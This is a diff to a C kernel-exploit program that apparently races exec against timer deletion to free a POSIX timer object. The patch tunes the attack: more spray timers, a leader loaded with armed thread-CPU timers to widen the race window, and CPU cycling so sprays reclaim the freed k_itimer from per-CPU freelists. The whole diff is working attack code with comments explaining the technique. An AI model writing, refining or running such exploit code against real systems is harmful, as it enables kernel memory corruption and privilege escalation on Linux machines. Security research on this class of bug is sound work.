@@ -60,7 +60,8 @@
 #include <unistd.h>
 
 #define MARKER_FD 3
-#define SPRAY_TIMERS 32
+#define SPRAY_TIMERS 64
+#define LEADER_LOAD_TIMERS 48
 #define CHURN_TIMERS 16
 #define CASCADE_TIMERS 8
 #define DHAMMER_TIMERS 512
@@ -380,8 +381,26 @@ static void *execer(void *arg)
 static void racing_child(long iter)
 {
 	pthread_t th_w;
+	struct sigevent sev = { .sigev_notify = SIGEV_NONE };
+	struct itimerspec its;
+	timer_t load[LEADER_LOAD_TIMERS];
 
 	pin(3);
+	/*
+	 * Widen the exec-side critical section: when de_thread() reaches
+	 * release_task(leader), __exit_signal() holds the sighand lock
+	 * while posix_cpu_timers_exit() dequeues every per-thread timer
+	 * of the old leader. Loading the leader with armed thread-CPU
+	 * timers stretches that hold, giving the parent's timer_delete()
+	 * a real span to collide with.
+	 */
+	memset(&its, 0, sizeof(its));
+	its.it_value.tv_sec = 10;
+	for (int i = 0; i < LEADER_LOAD_TIMERS; i++) {
+		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &load[i]) ||
+		    timer_settime(load[i], 0, &its, NULL))
+			break;
+	}
 	if (pthread_create(&th_w, NULL, execer, (void *)(intptr_t)iter)) {
 		emit("THREAD_FAIL iter=%ld errno=%d\n", iter, errno);
 		_exit(1);
@@ -426,6 +445,10 @@ static void phase2(unsigned long iter, unsigned mode, uint64_t t_go)
 			spray[i] = (timer_t)-1;
 		for (int i = 0; i < CHURN_TIMERS; i++)
 			churn[i] = (timer_t)-1;
+
+		/* The freed k_itimer lands on whichever per-CPU freelist ran
+		 * the RCU callback; cycle CPUs so the sprays sample them. */
+		pin(cycle & 1 ? 0 : 1);
 
 		for (int i = 0; i < SPRAY_TIMERS; i++)
 			if (timer_create(CLOCK_MONOTONIC, &sev, &spray[i]))
